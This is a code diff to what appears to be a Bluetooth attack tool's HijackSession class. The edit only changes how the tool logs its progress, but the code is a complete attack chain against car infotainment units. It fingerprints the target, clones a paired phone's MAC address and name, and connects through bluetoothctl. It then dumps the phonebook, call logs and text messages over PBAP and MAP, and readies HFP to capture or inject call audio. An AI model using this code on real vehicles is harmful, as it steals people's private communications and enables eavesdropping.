@@ -31,7 +31,7 @@ from bt_tap.attack.pbap import PBAPClient
 from bt_tap.attack.map_client import MAPClient
 from bt_tap.attack.hfp import HFPClient
 from bt_tap.utils.bt_helpers import validate_mac, normalize_mac
-from bt_tap.utils.output import info, success, error, warning, console
+from bt_tap.utils.output import info, success, error, warning, verbose, console, phase, step, substep, summary_panel, target
 
 
 class HijackSession:
@@ -75,44 +75,46 @@ class HijackSession:
 
     def recon(self) -> dict:
         """Phase 1: Reconnaissance - fingerprint IVI and find service channels."""
-        console.rule("[bold cyan]Phase 1: Reconnaissance")
+        with phase("Reconnaissance", 1, 5):
+            # Resolve phone name if not provided
+            if not self.phone_name:
+                with step("Resolving phone name"):
+                    self.phone_name = resolve_name(self.phone_address, self.hci)
+                    verbose(f"Resolved: {self.phone_name}")
 
-        # Resolve phone name if not provided
-        if not self.phone_name:
-            info("Resolving phone name...")
-            self.phone_name = resolve_name(self.phone_address, self.hci)
-            info(f"Phone name: {self.phone_name}")
+            # Fingerprint the IVI
+            with step("Fingerprinting IVI"):
+                self.ivi_fingerprint = fingerprint_device(self.ivi_address)
 
-        # Fingerprint the IVI
-        self.ivi_fingerprint = fingerprint_device(self.ivi_address)
+            # Find specific service channels
+            with step("Browsing SDP services"):
+                self.ivi_services = browse_services(self.ivi_address)
 
-        # Find specific service channels
-        self.ivi_services = browse_services(self.ivi_address)
+            with step("Locating target service channels"):
+                self.pbap_channel = find_service_channel(self.ivi_address, "Phonebook")
+                if not self.pbap_channel:
+                    self.pbap_channel = find_service_channel(self.ivi_address, "PBAP")
 
-        self.pbap_channel = find_service_channel(self.ivi_address, "Phonebook")
-        if not self.pbap_channel:
-            self.pbap_channel = find_service_channel(self.ivi_address, "PBAP")
+                self.map_channel = find_service_channel(self.ivi_address, "Message")
+                if not self.map_channel:
+                    self.map_channel = find_service_channel(self.ivi_address, "MAP")
 
-        self.map_channel = find_service_channel(self.ivi_address, "Message")
-        if not self.map_channel:
-            self.map_channel = find_service_channel(self.ivi_address, "MAP")
+                self.hfp_channel = find_service_channel(self.ivi_address, "Hands-Free")
+                if not self.hfp_channel:
+                    self.hfp_channel = find_service_channel(self.ivi_address, "HFP")
 
-        self.hfp_channel = find_service_channel(self.ivi_address, "Hands-Free")
-        if not self.hfp_channel:
-            self.hfp_channel = find_service_channel(self.ivi_address, "HFP")
+            # Summary
+            summary_panel("Recon Results", {
+                "IVI": f"{self.ivi_fingerprint.get('name', 'Unknown')} ({self.ivi_address})",
+                "Phone": f"{self.phone_name} ({self.phone_address})",
+                "PBAP Channel": str(self.pbap_channel or "NOT FOUND"),
+                "MAP Channel": str(self.map_channel or "NOT FOUND"),
+                "HFP Channel": str(self.hfp_channel or "NOT FOUND"),
+            })
 
-        # Summary
-        console.rule("[bold]Recon Summary")
-        info(f"IVI: {self.ivi_fingerprint.get('name', 'Unknown')} ({self.ivi_address})")
-        info(f"Phone to impersonate: {self.phone_name} ({self.phone_address})")
-        info(f"PBAP channel: {self.pbap_channel or 'NOT FOUND'}")
-        info(f"MAP channel: {self.map_channel or 'NOT FOUND'}")
-        info(f"HFP channel: {self.hfp_channel or 'NOT FOUND'}")
-
-        if self.ivi_fingerprint.get("attack_surface"):
-            success("Attack surface:")
-            for surface in self.ivi_fingerprint["attack_surface"]:
-                info(f"  -> {surface}")
+            if self.ivi_fingerprint.get("attack_surface"):
+                for surface in self.ivi_fingerprint["attack_surface"]:
+                    substep(f"Attack surface: {surface}")
 
         return {
             "fingerprint": self.ivi_fingerprint,
@@ -123,23 +125,19 @@ class HijackSession:
 
     def impersonate(self, method: str = "auto") -> bool:
         """Phase 2: Impersonate the phone (spoof MAC + name + class)."""
-        console.rule("[bold yellow]Phase 2: Impersonation")
-
-        # Determine phone's device class (smartphone = 0x5a020c)
-        device_class = "0x5a020c"  # Generic smartphone class
-
-        result = clone_device_identity(
-            self.hci, self.phone_address, self.phone_name, device_class
-        )
-
-        if result:
-            success(f"Now impersonating: {self.phone_name} ({self.phone_address})")
-            info("Waiting 2s for adapter to stabilize...")
-            time.sleep(2)
-        else:
-            error("Impersonation failed")
-
-        return result
+        with phase("Impersonation", 2, 5):
+            device_class = "0x5a020c"
+            with step(f"Cloning identity → {target(self.phone_address)}"):
+                result = clone_device_identity(
+                    self.hci, self.phone_address, self.phone_name, device_class
+                )
+            if result:
+                success(f"Now impersonating: {self.phone_name} ({target(self.phone_address)})")
+                info("Waiting 2s for adapter to stabilize...")
+                time.sleep(2)
+            else:
+                error("Impersonation failed")
+            return result
 
     def connect_ivi(self) -> bool:
         """Phase 3: Connect to the IVI as the spoofed phone.
@@ -147,110 +145,106 @@ class HijackSession:
         Uses bluetoothctl to pair, trust, then connect (per proven workflow).
         bluetoothctl is interactive, so we pipe commands via stdin.
         """
-        console.rule("[bold red]Phase 3: Connect to IVI")
+        with phase("Connect to IVI", 3, 5):
+            from bt_tap.utils.bt_helpers import run_cmd
 
-        from bt_tap.utils.bt_helpers import run_cmd
+            info(f"Connecting to IVI {self.ivi_address}...")
 
-        info(f"Connecting to IVI {self.ivi_address}...")
+            # bluetoothctl requires commands via stdin since it's interactive.
+            # Sequence: pair -> trust -> connect (from PDF workflow)
+            bt_commands = "\n".join([
+                f"pair {self.ivi_address}",
+                f"trust {self.ivi_address}",
+                f"connect {self.ivi_address}",
+                "quit",
+            ])
 
-        # bluetoothctl requires commands via stdin since it's interactive.
-        # Sequence: pair -> trust -> connect (from PDF workflow)
-        bt_commands = "\n".join([
-            f"pair {self.ivi_address}",
-            f"trust {self.ivi_address}",
-            f"connect {self.ivi_address}",
-            "quit",
-        ])
+            import subprocess
+            result = subprocess.run(
+                ["bluetoothctl"],
+                input=bt_commands,
+                capture_output=True,
+                text=True,
+                timeout=30,
+                errors="replace",
+            )
+            output = result.stdout + result.stderr
+            verbose(f"bluetoothctl output:\n{output.strip()}")
 
-        import subprocess
-        result = subprocess.run(
-            ["bluetoothctl"],
-            input=bt_commands,
-            capture_output=True,
-            text=True,
-            timeout=30,
-            errors="replace",
-        )
-        output = result.stdout + result.stderr
-        info(f"bluetoothctl output:\n{output.strip()}")
+            # Give profiles time to negotiate
+            time.sleep(3)
 
-        # Give profiles time to negotiate
-        time.sleep(3)
-
-        # Verify connection
-        verify = run_cmd(["bluetoothctl", "info", self.ivi_address])
-        if "Connected: yes" in verify.stdout:
-            success(f"Connected to IVI {self.ivi_address}")
-            return True
-        else:
-            warning("Connection status uncertain. Some profiles may still work.")
-            return True  # Try anyway
+            # Verify connection
+            verify = run_cmd(["bluetoothctl", "info", self.ivi_address])
+            if "Connected: yes" in verify.stdout:
+                success(f"Connected to IVI {self.ivi_address}")
+                return True
+            else:
+                warning("Connection status uncertain. Some profiles may still work.")
+                return True  # Try anyway
 
     def dump_phonebook(self, output_dir: str | None = None) -> dict:
         """Phase 4a: Download phonebook and call logs via PBAP."""
-        console.rule("[bold green]Phase 4a: PBAP Dump")
+        with phase("PBAP Data Extraction", 4, 5):
+            if not self.pbap_channel:
+                error("No PBAP channel found during recon. Run recon() first.")
+                return {}
 
-        if not self.pbap_channel:
-            error("No PBAP channel found during recon. Run recon() first.")
-            return {}
+            out = output_dir or f"{self.output_dir}/pbap"
+            self.pbap_client = PBAPClient(self.ivi_address, channel=self.pbap_channel)
 
-        out = output_dir or f"{self.output_dir}/pbap"
-        self.pbap_client = PBAPClient(self.ivi_address, channel=self.pbap_channel)
+            if not self.pbap_client.connect():
+                error("PBAP connection failed")
+                return {}
 
-        if not self.pbap_client.connect():
-            error("PBAP connection failed")
-            return {}
-
-        try:
-            results = self.pbap_client.pull_all_data(out)
-            success(f"PBAP dump complete: {len(results)} objects")
-            return results
-        finally:
-            self.pbap_client.disconnect()
+            try:
+                results = self.pbap_client.pull_all_data(out)
+                success(f"PBAP dump complete: {len(results)} objects")
+                return results
+            finally:
+                self.pbap_client.disconnect()
 
     def dump_messages(self, output_dir: str | None = None) -> dict:
         """Phase 4b: Download SMS/MMS messages via MAP."""
-        console.rule("[bold green]Phase 4b: MAP Dump")
+        with phase("MAP Data Extraction", 4, 5):
+            if not self.map_channel:
+                error("No MAP channel found during recon. Run recon() first.")
+                return {}
 
-        if not self.map_channel:
-            error("No MAP channel found during recon. Run recon() first.")
-            return {}
+            out = output_dir or f"{self.output_dir}/map"
+            self.map_client = MAPClient(self.ivi_address, channel=self.map_channel)
 
-        out = output_dir or f"{self.output_dir}/map"
-        self.map_client = MAPClient(self.ivi_address, channel=self.map_channel)
+            if not self.map_client.connect():
+                error("MAP connection failed")
+                return {}
 
-        if not self.map_client.connect():
-            error("MAP connection failed")
-            return {}
-
-        try:
-            results = self.map_client.dump_all_messages(out)
-            success(f"MAP dump complete")
-            return results
-        finally:
-            self.map_client.disconnect()
+            try:
+                results = self.map_client.dump_all_messages(out)
+                success(f"MAP dump complete")
+                return results
+            finally:
+                self.map_client.disconnect()
 
     def setup_audio(self) -> HFPClient | None:
         """Phase 5: Set up HFP for call audio interception."""
-        console.rule("[bold magenta]Phase 5: Audio Setup")
+        with phase("Audio Setup", 5, 5):
+            if not self.hfp_channel:
+                warning("No HFP channel found. Audio interception not available.")
+                return None
 
-        if not self.hfp_channel:
-            warning("No HFP channel found. Audio interception not available.")
-            return None
+            self.hfp_client = HFPClient(self.ivi_address, channel=self.hfp_channel)
 
-        self.hfp_client = HFPClient(self.ivi_address, channel=self.hfp_channel)
+            if not self.hfp_client.connect():
+                error("HFP connection failed")
+                return None
 
-        if not self.hfp_client.connect():
-            error("HFP connection failed")
-            return None
+            if not self.hfp_client.setup_slc():
+                error("HFP SLC setup failed")
+                return None
 
-        if not self.hfp_client.setup_slc():
-            error("HFP SLC setup failed")
-            return None
-
-        success("HFP ready for audio operations")
-        info("Use hfp_client.capture_audio() or hfp_client.inject_audio()")
-        return self.hfp_client
+            success("HFP ready for audio operations")
+            info("Use hfp_client.capture_audio() or hfp_client.inject_audio()")
+            return self.hfp_client
 
     def run_full_attack(self) -> dict:
         """Run the complete attack chain."""
@@ -315,12 +309,12 @@ class HijackSession:
             results["phases"]["audio"] = {"status": "failed", "error": str(e)}
 
         console.rule("[bold]Attack Summary")
-        for phase, result in results["phases"].items():
+        for phase_name, result in results["phases"].items():
             status = result["status"]
-            icon = {"success": "[green]+", "ready": "[green]+",
-                    "partial": "[yellow]~", "failed": "[red]-",
-                    "unavailable": "[dim]-"}.get(status, "[dim]?")
-            console.print(f"  [{icon}[/] {phase}: {status}")
+            icon = {"success": "[green]✔[/green]", "ready": "[green]✔[/green]",
+                    "partial": "[yellow]~[/yellow]", "failed": "[red]✖[/red]",
+                    "unavailable": "[dim]-[/dim]"}.get(status, "[dim]?[/dim]")
+            console.print(f"  {icon} {phase_name}: {status}")
 
         return results
 
